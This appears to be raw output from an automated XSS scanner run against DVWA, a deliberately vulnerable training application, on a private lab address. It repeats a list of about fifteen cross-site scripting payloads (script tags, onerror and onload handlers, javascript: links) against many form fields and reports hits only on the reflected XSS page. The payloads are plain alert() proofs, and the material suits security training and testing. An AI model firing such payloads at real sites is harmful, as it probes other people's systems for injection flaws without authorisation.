+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Login' (GET) on http://10.0.2.4/DVWA/vulnerabilities/brute using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/javascript (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/open_redirect (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/weak_id (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/exec (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.pt.md
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'id' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'Submit' (GET) on http://10.0.2.4/DVWA/vulnerabilities/sqli_blind using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] Failed to fetch http://10.0.2.4/instructions.php (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.fr.md
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.id.md
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'message' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'direction' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'encoded' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'password' (GET) on http://10.0.2.4/DVWA/vulnerabilities/cryptography using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <script>alert('XSS')</script>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <img src='x' onerror='alert(1)'>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <svg onload=alert('XSS')>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <body onload=alert('XSS')>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <img src=x onerror=alert(1)>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [+] XSS vulnerability found in input field 'name' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_r using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] Failed to fetch http://10.0.2.4/setup.php (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/fi/?page=include.php (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/csp (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/xss_d (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/instructions.php?doc=PDF
+[XSS] [!] Failed to fetch http://10.0.2.4/DVWA/vulnerabilities/source/low.php?redirect=info.php?id=2 (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/security.php (Status Code: 404)
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <input type='text' onfocus='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <textarea onmouseover='alert(1)'></textarea>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <div onmousemove='alert(1)'>Test</div>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <body onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <iframe src='javascript:alert(1)'></iframe>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <img src=x onerror=alert(1)>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <div id='x' style='width:100px;height:100px;background-color:green;' onclick='alert(1)'>Click me</div>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'default' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_d using payload: <form action='/' method='post' onsubmit='alert(1)'>Submit</form>
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.tr.md
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/compose.yml
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.pl.md
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/config/config.inc.php.dist
+[XSS] [!] No input fields found on http://10.0.2.4
+[XSS] [!] Failed to fetch http://10.0.2.4/manual (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/instructions.php?doc=changelog
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/README.vi.md
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/authbypass (Status Code: 404)
+[XSS] [!] Failed to fetch http://10.0.2.4/vulnerabilities/cryptography (Status Code: 404)
+[XSS] [!] No input fields found on http://10.0.2.4/DVWA/instructions.php
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>alert('XSS')</script>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <img src='x' onerror='alert(1)'>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <svg onload=alert('XSS')>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <a href='javascript:alert(1)'>Click me</a>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>document.write('<img src=x onerror=alert(1)>')</script>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <script>window.location='javascript:alert(1);'</script>
+[XSS] [-] No XSS vulnerability in input field 'txtName' (GET) on http://10.0.2.4/DVWA/vulnerabilities/xss_s using payload: <input type='text' onfocus='alert(1)'>
